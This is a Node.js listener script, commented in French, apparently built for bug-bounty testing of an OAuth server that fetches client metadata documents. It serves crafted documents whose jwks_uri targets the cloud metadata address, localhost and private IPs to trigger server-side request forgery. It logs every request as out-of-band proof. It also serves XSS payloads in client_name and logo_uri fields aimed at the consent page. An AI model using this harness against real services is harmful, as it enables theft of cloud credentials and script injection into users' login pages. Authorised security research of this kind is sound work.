// Listener jwks : sert un document CIMD parametrable (jwks_uri, token_endpoint_auth_method)
// et journalise TOUTE requete recue -> preuve OOB du fetch de second ordre (jwks_uri).
const http = require("http");
const fs = require("fs");
const crypto = require("crypto");
const PORT = Number(process.env.PORT || 8099);
const LOG = "/tmp/opencode/jwks-listener.log";
const log = (s) => { console.log(s); try { fs.appendFileSync(LOG, s + "\n"); } catch {} };

// cle RSA locale (elle servira a signer une assertion client pour la suite)
const { privateKey, publicKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
fs.writeFileSync("/tmp/opencode/jwks-key.pem", privateKey.export({ type: "pkcs8", format: "pem" }));
const KID = "bb-probe-key-1";
const jwk = publicKey.export({ format: "jwk" });
const JWKS = { keys: [{ ...jwk, kid: KID, use: "sig", alg: "RS256" }] };
fs.writeFileSync("/tmp/opencode/jwks.json", JSON.stringify(JWKS, null, 1));

const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://" + (req.headers.host || "x"));
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "?").toString().split(",")[0].trim();
  const ua = req.headers["user-agent"] || "-";
  log(`${new Date().toISOString()} | ${req.method} ${u.pathname}${u.search} | ip=${ip} | ua=${ua}`);

  if (u.pathname.startsWith("/doc/")) {
    const host = (req.headers.host || "").replace(/:\d+$/, "");
    const fwd = String(req.headers["x-forwarded-proto"] || "").split(",")[0].trim();
    const proto = fwd ? fwd : (String(req.headers.host || "").includes("lhr.life") || String(req.headers.host || "").includes("trycloudflare.com") || String(req.headers.host || "").includes("ngrok-free.app") ? "https" : (req.socket.encrypted ? "https" : "http"));
    const cid = `${proto}://${host}${u.pathname}`;
    const doc = {
      client_id: cid,
      client_name: u.searchParams.get("name") || "bb-jwks-research (document de test)",
      redirect_uris: [u.searchParams.get("redirect") || `${proto}://${host}/cb`],
      grant_types: ["authorization_code", "refresh_token"],
      response_types: ["code"],
      token_endpoint_auth_method: u.searchParams.get("auth") || "none",
      scope: "programs:read profile:read reports:read reports:write",
    };
    // un chemin = un cas (le client_id doit correspondre EXACTEMENT a l URL demandee :
    // aucune query string, sinon invalid_client)
    const CASES = {
      "/doc/nojwks.json": null,
      "/doc/jwks-mine.json": "__TUN__/jwks.json",
      "/doc/jwks-dead.json": "http://127.0.0.1:1/jwks.json",
      "/doc/jwks-cloud.json": "http://169.254.169.254/latest/meta-data/",
      "/doc/jwks-localhost.json": "http://localhost:8099/jwks.json",
      "/doc/jwks-private.json": "http://10.255.255.1/jwks.json",
      "/doc/jwks-pk.json": "__TUN__/jwks.json",
      "/doc/pk-nojwks.json": null,
      "/doc/phish1.json": null,
      "/doc/phish2.json": null,
      "/doc/phish3.json": null,
    };
    let jwksUri = Object.prototype.hasOwnProperty.call(CASES, u.pathname) ? CASES[u.pathname] : undefined;
    if (jwksUri === undefined) jwksUri = u.searchParams.get("jwks");
    if (jwksUri) doc.jwks_uri = jwksUri.replace("__TUN__", `https://${host}`);
    if (u.pathname === "/doc/jwks-private-key.json" || u.pathname === "/doc/jwks-pk.json" || u.pathname === "/doc/pk-nojwks.json") doc.token_endpoint_auth_method = "private_key_jwt";
    // --- test de rendu de la page de consentement (Kimi §2) ---
    if (u.pathname === "/doc/phish1.json") {
      doc.client_name = "BugSecure Africa <b>CONNEXION</b> SÉCURISÉE <img src=x onerror=alert(1)>";
      doc.logo_uri = `https://${host}/logo.svg`;
    }
    if (u.pathname === "/doc/phish2.json") { doc.client_name = "BugSecure Africa - Connexion securisee"; doc.logo_uri = "javascript:alert(document.domain)"; }
    if (u.pathname === "/doc/phish3.json") { doc.client_name = "BugSecure Africa"; doc.logo_uri = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="; }
    const body = JSON.stringify(doc);
    res.writeHead(200, { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) });
    res.end(body);
    return;
  }
  if (u.pathname === "/logo.svg") {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120"><rect width="120" height="120" fill="#0b3"/></svg>`;
    res.writeHead(200, { "Content-Type": "image/svg+xml" });
    res.end(svg);
    return;
  }
  if (u.pathname === "/jwks.json") {
    const body = JSON.stringify(JWKS);
    res.writeHead(200, { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) });
    res.end(body);
    return;
  }
  if (u.pathname === "/log") {
    let lines = ""; try { lines = fs.readFileSync(LOG, "utf8"); } catch {}
    res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
    res.end(lines);
    return;
  }
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("bb-jwks-listener\n");
});
server.listen(PORT, "0.0.0.0", () => log(`[jwks] en ecoute sur ${PORT} | KID=${KID}`));
